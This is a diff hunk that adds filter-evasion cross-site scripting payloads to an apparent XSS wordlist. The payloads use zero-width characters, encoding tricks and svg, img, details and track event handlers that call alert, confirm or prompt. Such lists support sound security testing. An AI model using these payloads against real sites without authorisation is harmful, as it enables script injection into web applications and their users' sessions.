@@ -2,6 +2,15 @@
 "<script>alert(1)</script>"
 <img src=x oNerRor=alert(1)>
 "<script>alert(1)</script>"
+<select><​style></select>
+<svg onload​=alert(1)> 
+<​/style>
+"><img src=x onerrora=confirm() onerror​=confirm(1)>
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<svg onload​=alert&#0000000040"1")><””>
+<svg%20onx=()%20onload=(confirm)(document.domain)>
+&#34;><track/onerror​=&#x27;confirm\%601\%60&#x27;> 
+ "\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
 "%3Cscript%3Ealert(1)%3C/script%3E"
 "<ScRiPt>alert(1)</ScRiPt>"
 "<img src=x onerror=alert(1)>"
